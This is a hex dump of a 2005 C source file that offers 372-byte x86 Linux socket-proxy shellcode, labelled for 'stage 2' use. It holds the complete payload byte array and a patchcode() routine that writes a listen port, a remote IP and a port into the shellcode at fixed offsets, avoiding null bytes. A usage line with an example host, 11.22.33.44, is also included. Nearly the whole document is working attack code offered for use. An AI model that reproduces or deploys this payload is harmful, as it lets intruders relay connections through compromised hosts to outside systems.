00000000  2f 2a 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |/*--------------|
00000010  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000040  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2a 0d 0a  |-------------*..|
00000050  20 2a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  | *              |
00000060  20 20 33 37 32 20 62 79  74 65 20 73 6f 63 6b 65  |  372 byte socke|
00000070  74 2d 70 72 6f 78 79 20  73 68 65 6c 6c 63 6f 64  |t-proxy shellcod|
00000080  65 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |e               |
00000090  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
000000a0  20 2a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  | *              |
000000b0  62 79 20 52 75 73 73 65  6c 6c 20 53 61 6e 66 6f  |by Russell Sanfo|
000000c0  72 64 20 2d 20 78 6f 72  74 40 74 74 79 36 34 2e  |rd - xort@tty64.|
000000d0  6f 72 67 20 20 20 20 20  20 20 20 20 20 20 20 20  |org             |
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
000000f0  20 2a 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | *--------------|
00000100  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000130  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2a 0d 0a  |-------------*..|
00000140  20 2a 20 20 20 20 66 69  6c 65 6e 61 6d 65 3a 20  | *    filename: |
00000150  78 38 36 2d 6c 69 6e 75  78 2d 62 6f 75 6e 63 65  |x86-linux-bounce|
00000160  2d 70 72 6f 78 79 2e 63  20 20 20 20 20 20 20 20  |-proxy.c        |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
00000190  20 2a 20 20 20 20 20 20  20 20 64 61 74 65 3a 20  | *        date: |
000001a0  31 32 2f 32 33 2f 32 30  30 35 20 20 20 20 20 20  |12/23/2005      |
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000001d0  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
000001e0  20 2a 20 20 20 20 20 20  20 20 69 6e 66 6f 3a 20  | *        info: |
000001f0  43 6f 6d 70 69 6c 65 64  20 77 69 74 68 20 44 54  |Compiled with DT|
00000200  50 20 50 72 6f 6a 65 63  74 2e 20 20 20 20 20 20  |P Project.      |
00000210  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000220  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
00000230  20 2a 20 64 69 73 63 72  69 70 74 69 6f 6e 3a 20  | * discription: |
00000240  54 68 69 73 20 69 73 20  61 20 78 38 36 2d 6c 69  |This is a x86-li|
00000250  6e 75 78 20 70 72 6f 78  79 20 73 68 65 6c 6c 63  |nux proxy shellc|
00000260  6f 64 65 2e 20 54 68 69  73 20 69 73 20 70 72 6f  |ode. This is pro|
00000270  62 61 62 6c 79 20 62 65  73 74 20 20 20 2a 0d 0a  |bably best   *..|
00000280  20 2a 20 09 20 20 20 20  20 20 20 20 75 73 65 64  | * .        used|
00000290  20 69 6e 20 73 74 61 67  65 20 32 20 73 69 74 75  | in stage 2 situ|
000002a0  61 74 69 6f 6e 73 2e 20  54 68 65 20 73 79 6e 74  |ations. The synt|
000002b0  61 78 20 66 6f 72 20 69  6e 76 6f 6b 69 6e 67 20  |ax for invoking |
000002c0  74 68 65 20 20 20 20 20  20 2a 0d 0a 20 2a 20 09  |the      *.. * .|
000002d0  20 20 20 20 20 20 20 20  70 61 74 63 68 63 6f 64  |        patchcod|
000002e0  65 20 69 73 20 61 73 20  66 6f 6c 6c 6f 77 73 3a  |e is as follows:|
000002f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000310  20 20 20 20 20 2a 0d 0a  20 2a 20 20 20 20 20 20  |     *.. *      |
00000320  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000360  20 20 20 20 20 2a 0d 0a  20 2a 20 09 09 70 61 74  |     *.. * ..pat|
00000370  63 68 63 6f 64 65 28 73  68 65 6c 6c 63 6f 64 65  |chcode(shellcode|
00000380  2c 33 31 33 33 37 2c 22  31 31 2e 32 32 2e 33 33  |,31337,"11.22.33|
00000390  2e 34 34 22 2c 38 30 29  3b 20 20 20 20 20 20 20  |.44",80);       |
000003a0  20 20 20 20 20 20 20 20  20 20 2a 0d 0a 20 2a 20  |          *.. * |
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000003f0  20 20 20 20 20 20 20 20  20 20 2a 0d 0a 20 2a 20  |          *.. * |
00000400  09 09 57 68 65 72 65 20  33 31 33 33 37 20 69 73  |..Where 31337 is|
00000410  20 74 68 65 20 70 6f 72  74 20 74 6f 20 6c 69 73  | the port to lis|
00000420  74 65 6e 20 74 6f 20 6f  6e 20 74 68 65 20 72 65  |ten to on the re|
00000430  6d 6f 74 65 20 68 6f 73  74 20 20 20 20 20 20 2a  |mote host      *|
00000440  0d 0a 20 2a 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |.. *------------|
00000450  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000480  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2a  |---------------*|
00000490  2f 0d 0a 0d 0a 63 68 61  72 20 73 68 65 6c 6c 63  |/....char shellc|
000004a0  6f 64 65 5b 5d 20 3d 0d  0a 22 5c 78 65 38 5c 78  |ode[] =.."\xe8\x|
000004b0  66 66 5c 78 66 66 5c 78  66 66 5c 78 66 66 5c 78  |ff\xff\xff\xff\x|
000004c0  63 36 5c 78 34 65 5c 78  35 65 5c 78 38 31 5c 78  |c6\x4e\x5e\x81\x|
000004d0  63 36 5c 78 31 38 5c 78  66 63 5c 78 66 66 5c 78  |c6\x18\xfc\xff\x|
000004e0  66 66 5c 78 65 62 5c 78  34 38 5c 78 38 39 5c 78  |ff\xeb\x48\x89\x|
000004f0  63 33 5c 78 36 61 5c 78  30 33 5c 78 35 39 5c 78  |c3\x6a\x03\x59\x|
00000500  62 30 5c 78 64 64 5c 78  63 64 22 0d 0a 22 5c 78  |b0\xdd\xcd".."\x|
00000510  38 30 5c 78 35 36 5c 78  38 39 5c 78 64 65 5c 78  |80\x56\x89\xde\x|
00000520  38 30 5c 78 63 63 5c 78  30 38 5c 78 36 61 5c 78  |80\xcc\x08\x6a\x|
00000530  30 34 5c 78 35 39 5c 78  62 30 5c 78 64 64 5c 78  |04\x59\xb0\xdd\x|
00000540  63 64 5c 78 38 30 5c 78  39 33 5c 78 35 65 5c 78  |cd\x80\x93\x5e\x|
00000550  63 33 5c 78 38 39 5c 78  63 32 5c 78 38 33 5c 78  |c3\x89\xc2\x83\x|
00000560  65 30 5c 78 31 66 5c 78  63 31 5c 78 65 61 22 0d  |e0\x1f\xc1\xea".|
00000570  0a 22 5c 78 30 35 5c 78  38 64 5c 78 38 65 5c 78  |."\x05\x8d\x8e\x|
00000580  37 38 5c 78 66 66 5c 78  66 66 5c 78 66 66 5c 78  |78\xff\xff\xff\x|
00000590  30 66 5c 78 61 62 5c 78  30 34 5c 78 39 31 5c 78  |0f\xab\x04\x91\x|
000005a0  63 33 5c 78 39 33 5c 78  62 30 5c 78 30 33 5c 78  |c3\x93\xb0\x03\x|
000005b0  38 64 5c 78 38 65 5c 78  34 38 5c 78 66 34 5c 78  |8d\x8e\x48\xf4\x|
000005c0  66 66 5c 78 66 66 5c 78  36 36 5c 78 62 61 5c 78  |ff\xff\x66\xba\x|
000005d0  30 31 22 0d 0a 22 5c 78  30 38 5c 78 63 64 5c 78  |01".."\x08\xcd\x|
000005e0  38 30 5c 78 63 33 5c 78  39 33 5c 78 62 30 5c 78  |80\xc3\x93\xb0\x|
000005f0  30 34 5c 78 38 64 5c 78  38 65 5c 78 34 38 5c 78  |04\x8d\x8e\x48\x|
00000600  66 34 5c 78 66 66 5c 78  66 66 5c 78 63 64 5c 78  |f4\xff\xff\xcd\x|
00000610  38 30 5c 78 63 33 5c 78  38 64 5c 78 62 65 5c 78  |80\xc3\x8d\xbe\x|
00000620  66 38 5c 78 66 65 5c 78  66 66 5c 78 66 66 5c 78  |f8\xfe\xff\xff\x|
00000630  33 31 5c 78 63 30 22 0d  0a 22 5c 78 33 31 5c 78  |31\xc0".."\x31\x|
00000640  63 39 5c 78 36 36 5c 78  62 39 5c 78 30 31 5c 78  |c9\x66\xb9\x01\x|
00000650  30 31 5c 78 66 33 5c 78  61 61 5c 78 33 31 5c 78  |01\xf3\xaa\x31\x|
00000660  63 30 5c 78 36 61 5c 78  30 31 5c 78 35 62 5c 78  |c0\x6a\x01\x5b\x|
00000670  35 30 5c 78 35 33 5c 78  36 61 5c 78 30 32 5c 78  |50\x53\x6a\x02\x|
00000680  38 39 5c 78 65 31 5c 78  62 30 5c 78 36 36 5c 78  |89\xe1\xb0\x66\x|
00000690  63 64 5c 78 38 30 5c 78  35 62 22 0d 0a 22 5c 78  |cd\x80\x5b".."\x|
000006a0  35 61 5c 78 36 38 5c 78  37 65 5c 78 66 66 5c 78  |5a\x68\x7e\xff\x|
000006b0  66 65 5c 78 66 66 5c 78  38 31 5c 78 30 34 5c 78  |fe\xff\x81\x04\x|
000006c0  32 34 5c 78 30 31 5c 78  30 31 5c 78 30 31 5c 78  |24\x01\x01\x01\x|
000006d0  30 31 5c 78 36 38 20 78  6f 72 5c 78 38 31 5c 78  |01\x68 xor\x81\x|
000006e0  30 34 5c 78 32 34 74 40  74 74 5c 78 36 61 5c 78  |04\x24t@tt\x6a\x|
000006f0  31 30 5c 78 35 31 5c 78  35 30 5c 78 38 39 22 0d  |10\x51\x50\x89".|
00000700  0a 22 5c 78 65 31 5c 78  62 30 5c 78 36 36 5c 78  |."\xe1\xb0\x66\x|
00000710  63 64 5c 78 38 30 5c 78  62 33 5c 78 30 34 5c 78  |cd\x80\xb3\x04\x|
00000720  62 30 5c 78 36 36 5c 78  63 64 5c 78 38 30 5c 78  |b0\x66\xcd\x80\x|
00000730  35 61 5c 78 35 30 5c 78  35 30 5c 78 35 32 5c 78  |5a\x50\x50\x52\x|
00000740  38 39 5c 78 65 31 5c 78  66 65 5c 78 63 33 5c 78  |89\xe1\xfe\xc3\x|
00000750  62 30 5c 78 36 36 5c 78  63 64 5c 78 38 30 5c 78  |b0\x66\xcd\x80\x|
00000760  38 39 22 0d 0a 22 5c 78  34 36 5c 78 66 63 5c 78  |89".."\x46\xfc\x|
00000770  65 38 5c 78 35 62 5c 78  66 66 5c 78 66 66 5c 78  |e8\x5b\xff\xff\x|
00000780  66 66 5c 78 65 38 5c 78  36 66 5c 78 66 66 5c 78  |ff\xe8\x6f\xff\x|
00000790  66 66 5c 78 66 66 5c 78  33 31 5c 78 63 30 5c 78  |ff\xff\x31\xc0\x|
000007a0  36 61 5c 78 30 31 5c 78  35 62 5c 78 35 30 5c 78  |6a\x01\x5b\x50\x|
000007b0  35 33 5c 78 36 61 5c 78  30 32 5c 78 38 39 5c 78  |53\x6a\x02\x89\x|
000007c0  65 31 5c 78 62 30 22 0d  0a 22 5c 78 36 36 5c 78  |e1\xb0".."\x66\x|
000007d0  63 64 5c 78 38 30 5c 78  35 62 5c 78 34 33 5c 78  |cd\x80\x5b\x43\x|
000007e0  35 66 5c 78 36 38 79 36  34 2e 5c 78 38 31 5c 78  |5f\x68y64.\x81\x|
000007f0  30 34 5c 78 32 34 6f 72  67 20 5c 78 36 38 6e 65  |04\x24org \x68ne|
00000800  65 64 5c 78 38 31 5c 78  30 34 5c 78 32 34 20 6a  |ed\x81\x04\x24 j|
00000810  6f 62 5c 78 36 61 5c 78  31 30 5c 78 35 31 5c 78  |ob\x6a\x10\x51\x|
00000820  35 30 5c 78 38 39 5c 78  65 31 22 0d 0a 22 5c 78  |50\x89\xe1".."\x|
00000830  62 30 5c 78 36 36 5c 78  63 64 5c 78 38 30 5c 78  |b0\x66\xcd\x80\x|
00000840  35 38 5c 78 38 39 5c 78  34 36 5c 78 66 38 5c 78  |58\x89\x46\xf8\x|
00000850  65 38 5c 78 31 39 5c 78  66 66 5c 78 66 66 5c 78  |e8\x19\xff\xff\x|
00000860  66 66 5c 78 65 38 5c 78  32 64 5c 78 66 66 5c 78  |ff\xe8\x2d\xff\x|
00000870  66 66 5c 78 66 66 5c 78  38 62 5c 78 35 65 5c 78  |ff\xff\x8b\x5e\x|
00000880  66 63 5c 78 38 62 5c 78  34 65 5c 78 66 38 22 0d  |fc\x8b\x4e\xf8".|
00000890  0a 22 5c 78 36 61 5c 78  30 31 5c 78 35 33 5c 78  |."\x6a\x01\x53\x|
000008a0  35 31 5c 78 36 61 5c 78  30 32 5c 78 35 31 5c 78  |51\x6a\x02\x51\x|
000008b0  35 33 5c 78 33 39 5c 78  64 39 5c 78 37 65 5c 78  |53\x39\xd9\x7e\x|
000008c0  30 32 5c 78 38 39 5c 78  63 62 5c 78 35 36 5c 78  |02\x89\xcb\x56\x|
000008d0  34 33 5c 78 38 64 5c 78  38 65 5c 78 37 38 5c 78  |43\x8d\x8e\x78\x|
000008e0  66 66 5c 78 66 66 5c 78  66 66 5c 78 33 31 5c 78  |ff\xff\xff\x31\x|
000008f0  64 32 22 0d 0a 22 5c 78  33 31 5c 78 66 36 5c 78  |d2".."\x31\xf6\x|
00000900  33 31 5c 78 66 66 5c 78  62 30 5c 78 38 65 5c 78  |31\xff\xb0\x8e\x|
00000910  63 64 5c 78 38 30 5c 78  35 65 5c 78 35 38 5c 78  |cd\x80\x5e\x58\x|
00000920  35 30 5c 78 38 39 5c 78  63 32 5c 78 38 33 5c 78  |50\x89\xc2\x83\x|
00000930  65 30 5c 78 31 66 5c 78  63 31 5c 78 65 61 5c 78  |e0\x1f\xc1\xea\x|
00000940  30 35 5c 78 38 64 5c 78  38 65 5c 78 37 38 5c 78  |05\x8d\x8e\x78\x|
00000950  66 66 5c 78 66 66 22 0d  0a 22 5c 78 66 66 5c 78  |ff\xff".."\xff\x|
00000960  30 66 5c 78 61 33 5c 78  30 34 5c 78 39 31 5c 78  |0f\xa3\x04\x91\x|
00000970  37 33 5c 78 30 34 5c 78  35 39 5c 78 35 39 5c 78  |73\x04\x59\x59\x|
00000980  65 62 5c 78 33 32 5c 78  35 38 5c 78 35 30 5c 78  |eb\x32\x58\x50\x|
00000990  65 38 5c 78 65 35 5c 78  66 65 5c 78 66 66 5c 78  |e8\xe5\xfe\xff\x|
000009a0  66 66 5c 78 35 38 5c 78  33 31 5c 78 66 66 5c 78  |ff\x58\x31\xff\x|
000009b0  34 37 5c 78 38 33 5c 78  37 63 22 0d 0a 22 5c 78  |47\x83\x7c".."\x|
000009c0  32 34 5c 78 30 34 5c 78  30 32 5c 78 37 34 5c 78  |24\x04\x02\x74\x|
000009d0  30 32 5c 78 66 37 5c 78  64 66 5c 78 30 31 5c 78  |02\xf7\xdf\x01\x|
000009e0  66 38 5c 78 65 38 5c 78  65 34 5c 78 66 65 5c 78  |f8\xe8\xe4\xfe\x|
000009f0  66 66 5c 78 66 66 5c 78  33 39 5c 78 63 30 5c 78  |ff\xff\x39\xc0\x|
00000a00  38 39 5c 78 63 32 5c 78  35 38 5c 78 33 31 5c 78  |89\xc2\x58\x31\x|
00000a10  66 66 5c 78 34 37 5c 78  38 33 5c 78 33 63 22 0d  |ff\x47\x83\x3c".|
00000a20  0a 22 5c 78 32 34 5c 78  30 32 5c 78 37 35 5c 78  |."\x24\x02\x75\x|
00000a30  30 32 5c 78 66 37 5c 78  64 66 5c 78 30 31 5c 78  |02\xf7\xdf\x01\x|
00000a40  66 38 5c 78 65 38 5c 78  64 64 5c 78 66 65 5c 78  |f8\xe8\xdd\xfe\x|
00000a50  66 66 5c 78 66 66 5c 78  35 39 5c 78 65 32 5c 78  |ff\xff\x59\xe2\x|
00000a60  62 31 5c 78 65 62 5c 78  38 38 22 3b 0d 0a 0d 0a  |b1\xeb\x88";....|
00000a70  69 6e 74 20 66 69 6e 64  5f 73 61 66 65 5f 6f 66  |int find_safe_of|
00000a80  66 73 65 74 28 69 6e 74  20 49 4e 54 5f 41 29 20  |fset(int INT_A) |
00000a90  7b 0d 0a 0d 0a 09 69 6e  74 20 49 4e 54 5f 42 3d  |{.....int INT_B=|
00000aa0  30 3b 0d 0a 09 0d 0a 09  64 6f 20 7b 0d 0a 09 09  |0;......do {....|
00000ab0  49 4e 54 5f 41 20 2d 3d  20 30 78 30 31 30 31 30  |INT_A -= 0x01010|
00000ac0  31 30 31 3b 09 49 4e 54  5f 42 20 2b 3d 20 30 78  |101;.INT_B += 0x|
00000ad0  30 31 30 31 30 31 30 31  3b 0d 0a 09 7d 0d 0a 09  |01010101;...}...|
00000ae0  77 68 69 6c 65 20 28 20  28 28 49 4e 54 5f 41 20  |while ( ((INT_A |
00000af0  26 20 30 78 30 30 30 30  30 30 66 66 29 20 3d 3d  |& 0x000000ff) ==|
00000b00  20 30 29 20 7c 7c 20 0d  0a 09 09 28 28 49 4e 54  | 0) || ....((INT|
00000b10  5f 41 20 26 20 30 78 30  30 30 30 66 66 30 30 29  |_A & 0x0000ff00)|
00000b20  20 3d 3d 20 30 29 20 7c  7c 20 0d 0a 09 09 28 28  | == 0) || ....((|
00000b30  49 4e 54 5f 41 20 26 20  30 78 30 30 66 66 30 30  |INT_A & 0x00ff00|
00000b40  30 30 29 20 3d 3d 20 30  29 20 7c 7c 0d 0a 09 09  |00) == 0) ||....|
00000b50  28 28 49 4e 54 5f 41 20  26 20 30 78 66 66 30 30  |((INT_A & 0xff00|
00000b60  30 30 30 30 29 20 3d 3d  20 30 29 20 29 3b 0d 0a  |0000) == 0) );..|
00000b70  0d 0a 09 72 65 74 75 72  6e 20 49 4e 54 5f 42 3b  |...return INT_B;|
00000b80  0d 0a 7d 0d 0a 0d 0a 76  6f 69 64 20 70 61 74 63  |..}....void patc|
00000b90  68 63 6f 64 65 28 63 68  61 72 20 2a 73 68 65 6c  |hcode(char *shel|
00000ba0  6c 63 6f 64 65 2c 20 69  6e 74 20 50 4f 52 54 5f  |lcode, int PORT_|
00000bb0  49 4e 2c 20 63 68 61 72  20 2a 49 50 2c 20 69 6e  |IN, char *IP, in|
00000bc0  74 20 50 4f 52 54 5f 4f  55 54 29 20 7b 0d 0a 09  |t PORT_OUT) {...|
00000bd0  0d 0a 09 69 6e 74 20 50  4f 52 54 5f 49 4e 5f 41  |...int PORT_IN_A|
00000be0  20 3d 20 28 28 6e 74 6f  68 73 28 50 4f 52 54 5f  | = ((ntohs(PORT_|
00000bf0  49 4e 29 20 3c 3c 20 31  36 29 20 2b 20 32 29 3b  |IN) << 16) + 2);|
00000c00  0d 0a 09 69 6e 74 20 50  4f 52 54 5f 49 4e 5f 42  |...int PORT_IN_B|
00000c10  20 3d 20 66 69 6e 64 5f  73 61 66 65 5f 6f 66 66  | = find_safe_off|
00000c20  73 65 74 28 50 4f 52 54  5f 49 4e 5f 41 29 3b 09  |set(PORT_IN_A);.|
00000c30  0d 0a 0d 0a 09 69 6e 74  20 49 50 5f 41 20 3d 20  |.....int IP_A = |
00000c40  69 6e 65 74 5f 61 64 64  72 28 49 50 29 3b 0d 0a  |inet_addr(IP);..|
00000c50  09 69 6e 74 20 49 50 5f  42 20 3d 20 66 69 6e 64  |.int IP_B = find|
00000c60  5f 73 61 66 65 5f 6f 66  66 73 65 74 28 49 50 5f  |_safe_offset(IP_|
00000c70  41 29 3b 0d 0a 0d 0a 09  69 6e 74 20 50 4f 52 54  |A);.....int PORT|
00000c80  5f 4f 55 54 5f 41 20 3d  20 28 28 6e 74 6f 68 73  |_OUT_A = ((ntohs|
00000c90  28 50 4f 52 54 5f 4f 55  54 29 20 3c 3c 20 31 36  |(PORT_OUT) << 16|
00000ca0  29 20 2b 20 32 29 3b 0d  0a 09 69 6e 74 20 50 4f  |) + 2);...int PO|
00000cb0  52 54 5f 4f 55 54 5f 42  20 3d 20 66 69 6e 64 5f  |RT_OUT_B = find_|
00000cc0  73 61 66 65 5f 6f 66 66  73 65 74 28 50 4f 52 54  |safe_offset(PORT|
00000cd0  5f 4f 55 54 5f 41 29 3b  09 0d 0a 0d 0a 09 2a 28  |_OUT_A);......*(|
00000ce0  69 6e 74 20 2a 29 26 73  68 65 6c 6c 63 6f 64 65  |int *)&shellcode|
00000cf0  5b 31 33 34 5d 20 3d 20  28 50 4f 52 54 5f 49 4e  |[134] = (PORT_IN|
00000d00  5f 41 20 2d 20 50 4f 52  54 5f 49 4e 5f 42 29 3b  |_A - PORT_IN_B);|
00000d10  0d 0a 09 2a 28 69 6e 74  20 2a 29 26 73 68 65 6c  |...*(int *)&shel|
00000d20  6c 63 6f 64 65 5b 31 34  31 5d 20 3d 20 50 4f 52  |lcode[141] = POR|
00000d30  54 5f 49 4e 5f 42 3b 0d  0a 0d 0a 09 2a 28 69 6e  |T_IN_B;.....*(in|
00000d40  74 20 2a 29 26 73 68 65  6c 6c 63 6f 64 65 5b 32  |t *)&shellcode[2|
00000d50  30 35 5d 20 3d 20 28 49  50 5f 41 20 2d 20 49 50  |05] = (IP_A - IP|
00000d60  5f 42 29 3b 0d 0a 09 2a  28 69 6e 74 20 2a 29 26  |_B);...*(int *)&|
00000d70  73 68 65 6c 6c 63 6f 64  65 5b 32 31 32 5d 20 3d  |shellcode[212] =|
00000d80  20 49 50 5f 42 3b 0d 0a  09 0d 0a 09 2a 28 69 6e  | IP_B;......*(in|
00000d90  74 20 2a 29 26 73 68 65  6c 6c 63 6f 64 65 5b 32  |t *)&shellcode[2|
00000da0  31 37 5d 20 3d 20 28 50  4f 52 54 5f 4f 55 54 5f  |17] = (PORT_OUT_|
00000db0  41 20 2d 20 50 4f 52 54  5f 4f 55 54 5f 42 29 3b  |A - PORT_OUT_B);|
00000dc0  0d 0a 09 2a 28 69 6e 74  20 2a 29 26 73 68 65 6c  |...*(int *)&shel|
00000dd0  6c 63 6f 64 65 5b 32 32  34 5d 20 3d 20 50 4f 52  |lcode[224] = POR|
00000de0  54 5f 4f 55 54 5f 42 3b  0d 0a 0d 0a 7d           |T_OUT_B;....}|
00000ded
